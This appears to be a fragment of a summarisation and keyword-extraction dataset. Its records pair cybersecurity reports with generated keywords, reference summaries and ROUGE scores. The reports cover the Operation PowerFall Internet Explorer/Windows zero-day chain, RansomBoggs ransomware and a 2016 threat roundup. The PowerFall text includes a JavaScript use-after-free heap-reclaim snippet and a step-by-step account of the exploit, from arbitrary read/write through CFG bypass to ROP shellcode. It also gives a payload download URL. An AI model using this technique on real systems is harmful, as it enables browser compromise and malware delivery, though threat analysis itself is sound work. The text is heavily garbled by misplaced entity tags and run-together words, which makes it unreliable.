Explorer allocates new LargeHeapBlock objects , which are used by IE \u2019s custom heap implementation . The LargeHeapBlock objects will store the addresses of buffers allocated for the arrays . If the expected memory layout is achieved successfully , the vulnerability will overwrite the value at the offset [CARDINAL] 0x14 of LargeHeapBlock with [CARDINAL] 0 , which happens to be the allocated block count . LargeHeapBlock structure for jscript9.dll [PERSON] x86After that , the exploit allocates a huge number of arrays and sets them to another array that was prepared at the initial stage of the exploitation . Then this array is set to null , and the exploit makes a call to the [ORG] CollectGarbage ( ) function . This results in defragmentation of the heap , and the modified LargeHeapBlock will be freed along with its associated array buffers . At this stage , the exploit creates a large amount of integer arrays in hopes of reclaiming the previously freed array buffers . The newly created arrays have a magic value set at index [CARDINAL] zero , and this value is checked through a dangling pointer to the previously freed array to detect if the exploitation was successful.url [ORG] Explorer and Windows [DATE] zero - [DATE] day exploits used in [FAC] Operation [FAC] PowerFall | Securelist1 11for ( var i = [CARDINAL] 0 ; i < K.length ; i + = [CARDINAL] 1 ) { K[i ] = new Array((0x1000 - 0x20 ) / 4 ) ; [ORG] K[i][0 ] = 0x888 ; // store magic for ( var i = [CARDINAL] 0 ; i < T.length ; i + = [CARDINAL] 1 ) { if ( T[i][0 ] = = 0x888 ) { // find array accessible through dangling pointer R = T[i ] ; } As a result , the exploit creates [CARDINAL] two different JavascriptNativeIntArray objects with buffers pointing to the same location . This makes it possible to retrieve the addresses of the objects and even create new malformed objects . The exploit takes advantage of these primitives to create a malformed [ORG] DataView object and get read / write access to the whole address space of the process . After the building of the arbitrary read / write primitives , it is time to bypass [ORG] Control [ORG] Flow [ORG] Guard ( CFG ) and get code execution . The exploit uses the [ORG] Array \u2019s vftable pointer to get the module base address of jscript9.dll . From there , it parses the [ORG] PE header of jscript9.dll to get the address of [ORG] the [ORG] Import [ORG] Directory [ORG] Table and resolves the base addresses of the other modules . The goal here is to find the address of the function [ORG] VirtualProtect ( ) , which will be used to make the shellcode executable . After that , the exploit searches for [CARDINAL] two signatures in [GPE] jscript9.dll . Those signatures correspond to the address of the [GPE] Unicode string \u201c split \u201d and the address of the function : JsUtil::DoublyLinkedListElement < ThreadContext>::LinkToBeginning < ThreadContext > ( ) . The address of the [GPE] Unicode string \u201c split \u201d is used to get a code reference to the string and with its help , to resolve the address of the function Js::JavascriptString::EntrySplit ( ) , which implements the string method split ( ) . The address of the function LinkToBeginning < ThreadContext > ( ) is used to obtain the address of the [ORDINAL] first ThreadContext object in the global linked list . The exploit locates the last entry in the linked list and uses it to get the location of the stack for the thread responsible for the execution of the script . After that comes the final stage . The exploit executes the split ( ) method and an object with an overridden valueOf ( ) method is provided as a limit argument . When the overridden valueOf ( ) method is executed during the execution of the function Js::JavascriptString::EntrySplit ( ) , the exploit will search the thread \u2019s stack to find the return address , place the shellcode in a prepared buffer , obtain its address , and finally build a return - oriented programming ( [ORG] ROP ) chain to execute the shellcode by overwriting the return address of the function . Next stageThe shellcode is a reflective [ORG] DLL loader for the portable executable ( [ORG] PE ) module that is appended to the shellcode . The module is very small in size , and the whole functionality is located inside a single function . It creates a file within a temporary folder with the nameurl [ORG] Explorer and Windows [DATE] zero - [DATE] day exploits used in [FAC] Operation [FAC] PowerFall | [DATE] Securelistok.exe and writes to it the contents of another executable that is present in the remote code execution exploit . After that , ok.exe is executed . The ok.exe executable contains is an elevation of privilege exploit for the arbitrary pointer dereference vulnerability CVE-2020 - 0986 in [ORG] the [ORG] GDI [ORG] Print [ORG] / [ORG] Print [ORG] Spooler [ORG] API . Initially , this vulnerability was reported to [ORG] Microsoft by an anonymous user working with [ORG] Trend Micro \u2019s [ORG] Zero [ORG] Day [ORG] Initiative back in [DATE] December [DATE] 2019 . Due to the patch not being released for [DATE] six [DATE] months since the original report , ZDI posted a public advisory for this vulnerability as a [DATE] zero - [DATE] day on [DATE] May 19 , [DATE] 2020 . [DATE] The [DATE] next [DATE] day , the vulnerability was exploited in the previously mentioned attack . The vulnerability makes it possible to read and write the arbitrary memory of the splwow64.exe process using interprocess communication , and use it to achieve code execution in the splwow64.exe process , bypassing the [ORG] CFG and [ORG] EncodePointer protection . The exploit comes with [CARDINAL] two executables embedded in its resources . The [ORDINAL] first executable is written to disk as CreateDC.exe and is used to create a device context ( [GPE] DC ) , which is required for exploitation . The [ORDINAL] second executable has the name [ORG] PoPc.dll and if the exploitation is successful , it is executed by splwow64.exe with a medium integrity level . We will provide further details on CVE-2020 - 0986 and its exploitation in a follow - up post . Execution of a malicious [ORG] PowerShell command from splwow64.exeThe main functionality of [ORG] PoPc.dll is also located inside a single function . It executes an encoded [ORG] PowerShell command that proceeds to download a file from www[.]static- cdn1[.]com / update.zip , saves it to the temporary folder as upgrader.exe and executes it . We were unable to analyze upgrader.exe because Kaspersky technologies prevented the attack before the executable was downloaded . IoCswww[.]static - cdn1[.]com / update.zip 5877EAECA1FE8A3A15D6C8C5D7FA240Burl Explorer and Windows [DATE] zero - [DATE] day exploits used in [FAC] Operation [FAC] PowerFall | Securelist7577E42177ED7FC811DE4BC854EC226EB037F797C3B114E163940A86FD8B078B 81D07CAE45CAF27CBB9A1717B08B3AB358B647397F08A6F9C7652D00DBF2AE24url", "generated_text": "the document; details; exploitation; Internet Explorer 11; vulnerabilities; JavaScript; jscript9; the vulnerability; DLL; access; a Remote Code Execution Exploit; Windows 10; the new full chain; the latest builds; 18363; 64; June; Microsoft; CVE-2020-0986; the exploitability; this vulnerability; less likely; this vulnerability; the vulnerability; a Use-After-Free vulnerability; the vulnerability; a use-after-free vulnerability; JScript; jscript.dll; a use-after-free vulnerability; a vulnerability; a use-after-free vulnerability; jscript.dll; a vulnerability; a use-after-free vulnerability; this attack; similarities; previously discovered exploits; DarkHotel; this attack; similarities; previous zero-day exploits; attacks; the PowerFall malware.", "ref_text": "<START-1>The PDF describes an attack called Operation PowerFall that exploited two zero-day vulnerabilities in Internet Explorer and Windows. The attack targeted a South Korean company in May 2020 and was detected and prevented by Kaspersky technologies. The attack used a full exploit chain that consisted of: - A remote code execution exploit for a use-after-free vulnerability in Internet Explorer's JScript engine (CVE-2020-1380). This allowed arbitrary code execution in the context of the browser. - An elevation of privilege exploit for an arbitrary pointer dereference vulnerability in the Windows GDI Print/Print Spooler API (CVE-2020-0986). This allowed escaping the sandbox and executing code in splwow64.exe. The Internet Explorer exploit gained read/write access to the process's memory using corrupted JavaScript objects. It then bypassed Control Flow Guard to execute shellcode that loaded a DLL containing the Windows exploit. The Windows exploit achieved code execution in splwow64.exe with medium integrity. It executed an obfuscated PowerShell command to download a file called upgrader.exe which was prevented by Kaspersky. Kaspersky believes an APT group called DarkHotel may be behind the attack due to similarities with previous exploits, but definitive attribution is not possible. The attack demonstrates 0-day exploits being used in the wild against the latest Windows 10 versions. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4770114942528736, "gpt3/lexical/rouge_rouge2": 0.21387283236994223, "gpt3/lexical/rouge_rougeL": 0.31609195402298856, "gpt3/lexical/rouge_rougeLsum": 0.31609195402298856, "gpt3_generated_text": ["The article discusses a recent attack called \"Operation PowerFall\" that targeted a South Korean company using zero-day exploits in Internet Explorer and Windows. The attack utilized a previously unknown full chain that included a remote code execution exploit for Internet Explorer and an elevation of privilege exploit for Windows. The exploits targeted the latest builds of Windows 10 and were able to reliably exploit Internet Explorer 11. The vulnerabilities were reported to Microsoft, and patches were released for them. The article suggests that the DarkHotel threat actor may be behind the attack based on similarities to previous exploits. The article also provides details about the specific vulnerabilities and how they were exploited. Overall, the article highlights the ongoing threat of zero-day exploits and the importance of timely patching and detection."]}, {"split_name": "val", "sample_id": "val_118", "prompt_text": "Extract the keywords: thehackernews.com /2022/11 / russia - based - ransomboggs - ransomware.html [GPE] Russia - based [ORG] RansomBoggs [ORG] Ransomware [ORG] Targeted Several Ukrainian [ORG] OrganizationsUkraine has come under a fresh onslaught of ransomware attacks that mirror previous intrusions attributed to the [GPE] Russia - based [ORG] Sandworm nation - state group . Slovak cybersecurity company ESET , which dubbed the new ransomware strain [ORG] RansomBoggs , said the attacks against several [NORP] Ukrainian entities were [ORDINAL] first detected on [DATE] November [DATE] 21 , [CARDINAL] 2022.\"While the malware written in .NET is new , its deployment is similar to previous attacks attributed to [ORG] Sandworm , \" the company said in a series of tweets [DATE] Friday . The development comes as the [ORG] Sandworm actor , tracked by [ORG] Microsoft as Iridium , was implicated for a set of attacks aimed at transportation and logistics sectors in [GPE] Ukraine and [GPE] Poland with another ransomware strain called [PERSON] Prestige in [DATE] October 2022.The RansomBoggs activity is said to employ a [ORG] PowerShell script to distribute the ransomware , with the former \" almost identical \" to the one used in the Industroyer2 malware attacks that came to light in April.1/2According to [ORG] the [ORG] Computer [ORG] Emergency [ORG] Response [ORG] Team [ORG] of [ORG] Ukraine ( CERT - UA ) , the [ORG] PowerShell script , named POWERGAP , was leveraged to deploy a data wiper malware called [ORG] CaddyWiper using a loader dubbed [ORG] ArguePatch ( aka [PERSON] AprilAxe).ESET 's analysis of the new ransomware shows that it generates a randomly generated key and encrypts files using AES-256 in CBC mode and appends the \" .chsch \" file extension . [ORG] Sandworm , an elite adversarial hacking group within [GPE] Russia 's GRU military intelligence agency , has a notorious track record of striking critical infrastructure over [DATE] the [DATE] years . The threat actor has been linked to the [ORG] NotPetya cyberattacks against hospitals and medical facilities in [DATE] 2017 and the destructive assaults against the [NORP] Ukrainian electrical power grid in [DATE] 2015 and [CARDINAL] 2016.2/2", "generated_text": "security firm; ESET; the new ransomware; RansomBoggs; several Ukrainian organizations; November 21; 2022; similarities; Sandworm; Iridium; the attacks; transportation; logistics sectors; Poland; another ransomware strain; Prestige; the Industroyer2 malware; the malware; PowerShell; data wiper malware; CaddyWiper; CaddyWiper; second; the attackers; Ukrainian infrastructure; the infrastructure; the attacks; infrastructure; a PowerShell script; a PowerGAP; PowerGAP; CaddyWiper; AprilAxe; analysis; the malware; the malware; a random generated key; encrypts files; AES-256; CBC mode; the PowerShell script; Industroyer2 malware; the Sandworm threat actor.", "ref_text": "<START-1>A new ransomware strain called RansomBoggs has been used in recent attacks against Ukrainian organizations. The attacks were first detected on November 21, 2022 and have similarities to previous intrusions attributed to the Russia-based Sandworm hacking group. RansomBoggs uses a PowerShell script to distribute the ransomware, which is nearly identical to the one used by the Industroyer2 malware earlier this year. The ransomware generates an encryption key, encrypts files using AES-256 algorithm, and appends the .chsch extension to encrypted files. Sandworm is an elite Russian state-sponsored hacking group within the GRU military intelligence agency linked to past attacks on Ukrainian critical infrastructure. The similarities in tactics and infrastructure suggest RansomBoggs could be the latest ransomware operation conducted by Sandworm against Ukrainian targets. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.547486033519553, "gpt3/lexical/rouge_rouge2": 0.30337078651685395, "gpt3/lexical/rouge_rougeL": 0.4022346368715084, "gpt3/lexical/rouge_rougeLsum": 0.4022346368715084, "gpt3_generated_text": ["In a recent series of ransomware attacks, several Ukrainian organizations have been targeted by a new strain of malware called RansomBoggs. The attacks were first detected on November 21, 2022, and have similarities to previous intrusions attributed to the Russia-based Sandworm nation-state group. Slovak cybersecurity company ESET, which named the new ransomware strain, noted that while the malware is new, its deployment is similar to previous Sandworm attacks. This comes after the Sandworm actor, also known as Iridium by Microsoft, was implicated in attacks on the transportation and logistics sectors in Ukraine and Poland in October 2022, using another ransomware strain called Prestige. The RansomBoggs activity utilizes a PowerShell script to distribute the ransomware, which is similar to the one used in the Industroyer2 malware attacks discovered in April. The Computer Emergency Response Team of Ukraine (CERT-UA) revealed that the PowerShell script, named POWERGAP, was used to deploy a data wiper malware called CaddyWiper, using a loader known as ArguePatch or AprilAxe. ESET's analysis of the new ransomware shows that it generates a randomly generated key and encrypts files using AES-256 in CBC mode, appending the \".chsch\" file extension. Sandworm, a notorious hacking group within Russia's GRU military intelligence agency, has a history of targeting critical infrastructure, including the NotPetya cyberattacks in 2017 and the destructive assaults on the Ukrainian electrical power grid in 2015 and 2016."]}, {"split_name": "val", "sample_id": "val_119", "prompt_text": "Extract the keywords: TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsContents4 [PERSON] Ransomware [PERSON] Spiked 752 % in [GPE] New [GPE] Families in [DATE] 20168 [ORG] BEC Scams Generate [CARDINAL] Hundreds of [CARDINAL] Thousands in Losses Across the World10 Adobe Acrobat Reader DC and Advantech \u2019s WebAccess Have the Most Number of Vulnerabilities13 Mirai Botnet \u2019s Massive DDoS Attack Elevates IoT Security Conversation15 Biggest Data Breach in History Underscores Responsible Disclosure of Companies18 Angler Leaves the Scene with Other Exploit [ORG] Kits [ORG] Rising21 [ORG] Bank [ORG] Hacking [ORG] Perseveres [ORG] with [ORG] Banking [ORG] Trojans and [ORG] ATM [ORG] Malware Developments24 Threat Landscape in [PRODUCT] Review2016 was [DATE] an [DATE] unprecedented [DATE] year for cybersecurity , particularly for enterprises . Although there were considerable wins in terms of cybercriminal arrests \u2014 resulting in the drop in exploit kit numbers \u2014 an array of threats , which hit a record high , still caused [MONEY] billions [MONEY] of [MONEY] dollars in accumulated losses . It was indeed [DATE] the [DATE] year of online extortion , with ransomware leading the charge . [CARDINAL] Over [CARDINAL] 200 new ransomware families triggered significant damages to a number of institutions worldwide . Business email compromise ( [ORG] BEC ) , likewise , raked in huge profits for cybercriminals while proving to everyone that social engineering is still very effective when targeting large organizations.in widely used platforms , Vulnerabilities discovered including [ORG] Supervisory [ORG] Control and [ORG] Data [ORG] Acquisition ( [ORG] SCADA ) , also surpassed records in terms of volume . This left security researchers and malicious actors caught in a race to find weak points in a system [ORDINAL] first . The biggest data breach in history was also reported in [DATE] 2016 . The event exposed issues in how some companies handle user data . Other organizations felt the effects of poor Internet of Things ( [ORG] IoT ) security when the [ORG] Mirai botnet surfaced and took down their servers . Banking threats also continued to develop , posing new challenges to the financial sector . This roundup reviews the pertinent security stories of [DATE] 2016 and aims to help enterprises determine what to expect in [DATE] the [DATE] months [DATE] ahead and what security strategies they can adopt to stay protected . Ransomware Spiked 752 % in [GPE] New [GPE] Families in [CARDINAL] 2016In [DATE] a [DATE] span [DATE] of [DATE] 12 [DATE] months , the number of discovered ransomware families jumped from [CARDINAL] 29 to [CARDINAL] 247 . This marksa 752 % increase compared to the volume of ransomware families detected in 2015.2501500247752 % increase2920152016Figure [CARDINAL] 1 . Number of newly added ransomware families , 2016This record increase in new families can be a result of different of factors , the [ORDINAL] first being how effectiveransomware is as a moneymaking scheme . Using ransomware , cybercriminals reportedly managed torake in [MONEY] about US$ [MONEY] 1 [MONEY] billion in [CARDINAL] 2016.1 The whopping amount is the result of several affected enterprises stillchoosing to pay their attackers to have their data and assets decrypted and restored . Although many organizations are advised not to pay the ransom and focus on creating backups , this is easiersaid than done . Many of [DATE] 2016 \u2019s new ransomware families were designed to target specific file types criticalto businesses . These include tax return files , server files , virtual desktop images and the like . Database filesthat are used to manage pertinent business information have also become targets.24 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise Threats10050967581700Database\ufb01lesWebsite\ufb01lesSQL \ufb01lesTax \ufb01lesCAD \ufb01lesVirtualdesktop \ufb01les2219Figure 2 . Number of known ransomware families encrypting business - related files , 2016NOTE : For the full list of ransomware families , refer to table [CARDINAL] 7 in the appendix . Affected enterprises also had to withstand significant system downtime and corporate data loss . [PERSON] Despitenot having any guarantee of getting their data back , many organizations still opted to give in to cybercriminaldemands . In [DATE] November , [ORG] the [ORG] San [ORG] Francisco [ORG] Municipal [ORG] Transportation [ORG] Agency was asked to pay [MONEY] 100 [MONEY] bitcoins(approximately US$ [MONEY] 70,000 ) after a ransomware attack locked their computers.3 [PERSON] VESK , a provider of hostedvirtual desktops , paid [MONEY] approximately US$ [MONEY] 23,000 to get the decryption keys that will restore all of [DATE] theirservices.4 [ORG] The [ORG] New [ORG] Jersey [ORG] Spine [ORG] Center paid an undisclosed amount after attackers encrypted electronicmedical records , disabled their phone system , and even locked out staff members from accessing theirbackup files.5Other factors driving the increase of ransomware families were the presence of open source ransomwareand the introduction of ransomware - as - a - service ( RaaS ) . Originally designed for educational purposes , open source ransomware like [GPE] Hidden [GPE] Tear [GPE] and [PRODUCT] EDA2 were used by cybercriminals to target web serversand databases.6 The source codes for those ransomware strains have already been taken down after thereported abuse . RaaS also made it easier for rookie cybercriminals to utilize ransomware . Since RaaS isavailable in the underground , the service provides fledgling cybercriminals the necessary tools to run theirown extortion campaigns.7Among the ransomware threats we detected and blocked in [DATE] 2016 , spam remained the top ransomwarevector , accounting for 79 % . Since email has become the most common entry point for ransomware\u2212eithervia malicious attachments or URLs found in the email\u2212organizations should be able to utilize web and emailgateway solutions . Possible ransomware threats can be prevented through effective monitoring of emailtraffic and filtering potentially unsafe URLs , attachments , and other malicious payloads.5 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsCRYPRADAM Encrypts files related to hosting Asks for [CARDINAL] 13 bitcoins , [CARDINAL] one of the highest at that timeCERBER Incorporates various tactics such as use of Windows \u00ae scripting files and cloud platforms ; [ORDINAL] first to introduce voice readout of a ransom note [PERSON] Overwrites Master [PERSON] Boot [PERSON] Record ( MBR)WALTRIX [CARDINAL] 2.0 Encrypts files and prevents access to desktop via lock screen ZCRYPT Spreads through [ORG] USB dongles and flash [ORG] drivesCRYPBEE [ORG] Uses malicious macros and compromised websites as Threatens to delete one file every six hours of nonpayment . It threatens to delete all encrypted files after [TIME] 96 [TIME] hours of nonpayment . [PERSON] MILICRY [PERSON] Packages and sends gathered information as a .PNG file DETOXCRYPTO 2.0 Uses a spoofed [ORG] Trend [ORG] Micro [ORG] certificateSMASHLOCK [ORG] Disables [ORG] Task Manager , command line , and Registry Editor . It displays a series of message boxes including a timer and progress bar . [ORG] TELECRYPT [ORG] Uses [ORG] Telegram channels ( api.telegram.org ) to communicate with its command and control ( [ORG] C&C ) [ORG] serverJANFEBMARAPRMAYJUNJULAUGSEPOCTNOVDECLOCKY [ORG] Arrives as a macro embedded in spam attachment , a new method identified at that [PRODUCT] timeJIGSAW [PRODUCT] Threatens to delete a number of files for [TIME] every [TIME] hour the ransom is not paid WALTRIX [CARDINAL] One of the [ORDINAL] first ransomware families in [DATE] 2016 distributed via exploit [PERSON] kitsGOOPIC [PERSON] Dropped by [PERSON] Rig exploit kit ; gives users longer period for ransom payment before permanently encrypting data [ORG] MIRCOP [ORG] Disguises itself as a fake [ORG] Thai [ORG] Customs form . Instead of the usual ransom note , [ORG] MIRCOP demands to be paid back , assuming affected users know how ransomware payment works . It also asks for [CARDINAL] more [CARDINAL] than [CARDINAL] 40 bitcoins in payment \u2014 one of the highest seenCERBER 3.0 Is distributed by [ORG] Magnitude and [PERSON] Rig exploit kits ELFREXDDOS A Linux ransomware that is capable of launching DDoS attacksCOMLINE [ORDINAL] First ransomware seen that uses command line to execute [ORG] SHOR7CUT [ORG] Targets web [ORG] serversPOPCORNTYM [ORG] Instructs affected users to spread the malware in exchange for the Connects to MISCHA and [ORG] PETYA ransomware . This malware reboots the system which triggers the ransomware \u2019s encryption routine . Figure [CARDINAL] 3 . A timeline of noteworthy ransomware families , [CARDINAL] 20166 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsReputation - based analysis should also be able to filter against web and file threats . Based on the numberof ransomware - related detections , downloads from URLs that host ransomware or exploit kits distributingransomware were at [PERCENT] 20 % , while detections from actual ransomware files were at 1%.Security solutions that are able to blend this kind of reputation technology with other anti - ransomwarecapabilities like whitelisting and application control , behavioral analysis , network monitoring , vulnerabilityshielding , and high - fidelity machine learning can better protect organizations while minimizing the impact ontheir computing resources . Endpoint application control , for example , allows users within the organizationto access known good files while the rest go through filtering . This provides undisrupted access to safecontent while limiting incidents of false positives . Machine learning , utilized during pre - execution and runtime , can further provide more accurate detection . As ransomware families continue to evolve and multiply , it is critical for enterprises to recognize this realityand help make their data security strategy stronger and more efficient.7 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsBEC Scams Generate [CARDINAL] Hundreds of [CARDINAL] Thousands in Losses Across the WorldBEC attacks are responsible for causing an average of US$ [MONEY] 140,000 in losses for companies worldwide.8Leoni [ORG] AG , the [ORDINAL] fourth largest wire and cable manufacturer in the world , became a victim of a [ORG] BEC attack whenits Chief Financial Officer ( CFO ) was tricked into transferring [MONEY] about US$ 44.6 [MONEY] million to a foreign account.9Scammers also swindled [MONEY] approximately US$ 330,000 from the local council of Brisbane in [GPE] Australia afterthey posed as [CARDINAL] one of the council \u2019s suppliers.10 [ORG] SS&C [ORG] Technology also lost US$ [MONEY] 6 [MONEY] million to a [ORG] BEC scam thatforced the company to temporarily take its operations offline.11BEC scams have spread in [CARDINAL] 92 countries . Those most affected countries include [GPE] the [GPE] United [GPE] States , [GPE] theUnited [GPE] Kingdom , [GPE] Hong [GPE] Kong , [GPE] Japan , and [GPE] India . The map below shows all the affected regions in [CARDINAL] 2016.U.K. 9.61%Norway 2.02%U.S.37.55%France 2.20%Japan 2.75%Hong Kong2.85%Brazil 2.34%Argentina1.45%India 2.39%Australia2.34%>1.44%1.44 % - 1%<1%Unspeci(cid:31)ed country domainsFigure 4 . Countries with the most number of companies affected by [ORG] BEC , [DATE] 20168 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsIn the latter part of [DATE] the [DATE] year , cybercriminals ramped up their campaigns with CEO fraud schemes , a type ofBEC scam wherein cybercriminals impersonate a CEO or any executive who can authorize fund transfers . Cybercriminals used this technique when they targeted [CARDINAL] 17 healthcare institutions in [GPE] the [GPE] United [GPE] States , [DATE] 10 in [GPE] the [GPE] United [GPE] Kingdom , and [CARDINAL] eight in [GPE] Canada in just [CARDINAL] two weeks.12 These institutions included general andteaching hospitals , specialty care and walk - in clinics , and even pharmaceutical companies . Since [ORG] BEC scams heavily rely on social engineering , there \u2019s great weight on the human factor . The morestaff members \u2014 from a CEO to a rank - and - file employee \u2014 are aware of how BEC works and how to identifyit , the more equipped an organization will be to defend against this threat . Fraudulent wire transfer requestsusually require urgent action from the targeted employee . And so it is important for everyone to scrutinizeand double - check transfer details [ORDINAL] first . Recognizing phishing emails , in particular , and being wary of clickingon any links can also reduce the chances of being at the mercy of cybercriminals . When processing confidential emails , it is also recommended to manually enter the email addresses of theconcerned parties instead of just relying on the provided default addresses . Manually typing addressesfrom a contact list will help ensure that correspondences and wire transfers are indeed legitimate . Havinganother efficient method of verifying a fund transfer , such as phone verification , will also help reduce the riskof processing a fraudulent request . Since most types of [ORG] BEC emails do n\u2019t involve a malware payload , traditional email solutions that tend to onlydetect malicious behavior wo n\u2019t be able to stop these kinds of scams from landing inside an employee\u2019sinbox . Organizations are recommended to have web and email gateway solutions that do n\u2019t only have anti - spam and anti - phishing capabilities but also context - aware social engineering attack protection features , which are capable of inspecting email headers and other social engineering tactics used in [ORG] BEC [ORG] attacks.9 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsAdobe Acrobat Reader DC and Advantech \u2019s WebAccess Have the Most Number of VulnerabilitiesIn [DATE] 2016 , [ORG] Trend [ORG] Micro and the Zero Day Initiative ( ZDI ) ( with [ORG] TippingPoint ) discovered a record high [PERSON] of765 vulnerabilities ( including [CARDINAL] 60 [CARDINAL] zero days)\u2014an increase from [CARDINAL] 714 in [DATE] 2015 . Of the [CARDINAL] 765 total , [ORG] Trend [ORG] Microresearchers independently discovered [CARDINAL] 103 vulnerabilities , while ZDI found [CARDINAL] 678 . [CARDINAL] Sixteen vulnerabilities arecommon to both . Trend Micro8716ZDI662ProductNumber of [ORG] VulnerabilitiesAdvantech WebAccess109Adobe \u00ae Acrobat \u00ae Reader DCApple \u00ae OS X \u00ae [ORG] AndroidFoxit \u00ae [ORG] ReaderAdobe Flash \u00ae [ORG] Microsoft \u00ae Internet Explorer \u00ae [ORG] Microsoft Windows \u00ae OSSolarWinds \u00ae [ORG] Microsoft Edge895252493833262522Figure 5 . Number of vulnerabilities discovered byTable 1.Trend Micro and ZDI ( with TippingPoint)Trend Micro and ZDI , 2016Top [CARDINAL] 10 applications based on number ofvulnerabilities discovered in 2016Most of the vulnerabilities were found in [ORG] Adobe [ORG] Acrobat [ORG] Reader [ORG] DC and Advantech \u2019s WebAccess ( with [DATE] 26zero [DATE] days ) . The former is an enterprise application that handles .PDF files , while the latter is used in [GPE] SCADAsystems.10 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsAlthough Adobe Acrobat Reader DC saw no increase or decrease from its [DATE] 2015 record , the application stillhad the most number of vulnerabilities compared to all other [ORG] Adobe products . [PERSON] Adobe [PERSON] Flash noticeably hadfewer vulnerabilities compared to [DATE] last [DATE] year \u2019s [CARDINAL] 67 vulnerabilities , which marks a 43 % decrease . That numbermay continue to drop as more browsers are disabling Flash by default and are now migrating to HTML5.13Despite that , the presence of [PERSON] Adobe [PERSON] Flash [DATE] zero - [DATE] day vulnerabilities14 still leaves outdated systems vulnerableto attacks . For instance , an [PERSON] Adobe [PERSON] Flash [DATE] zero [DATE] day allowed attackers behind [PERSON] Pawn [PERSON] Storm to ramp up theirspear - phishing campaigns against governments and embassies across the world.15Meanwhile , [ORG] Microsoft saw a 47 % decrease in its vulnerabilities , with a total of [CARDINAL] 93 recorded vulnerabilities \u2014 down from [DATE] the [DATE] previous [DATE] year \u2019s [DATE] 175 . While Internet Explorer still has the highest number of vulnerabilitiesamong all [ORG] Microsoft products , the total volume of the vulnerabilities found on the platform got significantlylower . From [CARDINAL] 121 recorded vulnerabilities in [DATE] 2015 , it came down to [CARDINAL] only [CARDINAL] 33 , indicating a 73 % decrease . There are a few factors which may have affected this drop . Apart from [ORG] Microsoft offering bounty programsfor bugs and vulnerabilities , the vendor has also been proactive in rolling out security patches . Instead ofmaking individual bulletins for each patch available , [ORG] Microsoft is pooling all the updates into a single monthlydeployment.16 This streamlined approach is better at providing users with continued security . [PERSON] VendorProduct2015 vs. [PERSON] 2016VendorProduct2015 vs. [CARDINAL] 2016MicrosoftInternet [ORG] ExplorerOffice \u00ae WindowsEdgeMSXMLChakra . NETReader53%26%47%73 % \u25bc [PERCENT] 100 % \u25b2 Windows Media \u00ae Center100 % \u25b2 [PERCENT] 17 % \u25bc 206 % \u25b2 0DaysAndroidAdobeAppleSCADAFlashAcrobat Reader [ORG] DCAcrobat [ORG] Pro DCDigital EditionCreative Cloud \u00ae iOS \u00ae OS XQuickTime \u00ae [PERSON] Safari \u00ae 8%43%0 % \u25bc 421 % \u25b2 Table 2.Trend Micro and ZDI ( with TippingPoint)discovered vulnerabilities [DATE] 2015 versus [DATE] 201611 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsThe number of vulnerabilities found in [ORG] Apple products , on the other hand , saw a considerable rise in 2016.There were [CARDINAL] 81 vulnerabilities in its products in [DATE] 2016 \u2014 a 145 % increase from the [CARDINAL] 33 discovered vulnerabilitiesin [DATE] 2015 . Its desktop computing ( OS X ) and smartphone ( iOS ) products , both of which are used in enterprises , saw a 189 % and 275 % increase , respectively , in [DATE] 2016 . In [DATE] October , attackers abused the iOS platformto replace a legitimate app in the App Store \u00ae with a malformed and enterprise - signed app . Through therepackaged and adware - laden apps , hackers were able to manipulate iOS \u2019s code signing process , andgranted them access to a user \u2019s personally identifiable information ( PII ) and banking credentials . Advantech \u2019s [ORG] WebAccess had the most number of discovered vulnerabilities for [DATE] 2016 . These and [CARDINAL] otherSCADA vulnerabilities can be leveraged to compromise critical components in industrial automationnetworks . Many essential services and utilities , like water and electricity , rely on [GPE] SCADA so failing to securethese systems could lead to real - world risks . An example of which was the power outage caused by amalware called [ORG] BlackEnergy . The attack was directed against a power grid , which left [CARDINAL] about [CARDINAL] half of thehomes in a [GPE] Ukrainian region with no access to electricity for several hours.18 For the list of other SCADAapplications with discovered vulnerabilities , refer to [LAW] Table [LAW] 5 in [FAC] the [FAC] Threat [FAC] Landscape in Review section . As for mobile platforms , our data showed that [ORG] Android vulnerabilities increased by 206 % in [DATE] 2016 . A malwarevariant called [PERSON] DressCode allows attackers to gain access to internal networks every time devices withTrojanized apps are connected to them . [CARDINAL] At [CARDINAL] least [CARDINAL] 3,000 Trojanized apps were found in well - known Androidmarkets and even Google Play.19Knowing that there are a number of vulnerabilities on [ORG] SCADA systems allows the private and public sectorsto develop an efficient security framework before attackers can find ways to exploit them . Initiatives like ZDI(founded by [ORG] TippingPoint ) can help in this aspect . ZDI rewards security researchers for responsibly reportingvulnerabilities in various products and platforms . After these vulnerabilities are disclosed , vendors createand deliver the patches . System administrators should make it a habit to apply security patches once they \u2019re made available . In theabsence of official vendor fixes , they can use virtual patching is an interim solution that will help protectsystems from possible [CARDINAL] zero days.12 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsMirai Botnet \u2019s Massive DDoS Attack Elevates IoT Security ConversationPreviously , attacks on [ORG] IoT devices have only been proofs of concept ( PoCs ) . Smart watches20 and smart lightbulbs21 were some of the connected devices that were repeatedly hacked by researchers to demonstratehow , with the right tools and methods , [NORP] IoT devices can be exploited . All of these hacks have been isolatedcases ; none of which have been replicated on a massive scale . During [DATE] the [DATE] last [DATE] quarter [DATE] of [DATE] 2016 , attackers \u2014 through the use of the [ORG] Mirai botnet \u2014 targeted [ORG] DNS provider [PERSON] Dynwith a distributed denial - of - service ( DDoS ) attack.22 [NORP] Attackers hijacked [CARDINAL] approximately [CARDINAL] 100,000 vulnerableIoT devices such as security cameras to be part of a botnet.23 The large - scale attack against [GPE] Dyn , whichcaused packet flow bursts of [CARDINAL] up [CARDINAL] to 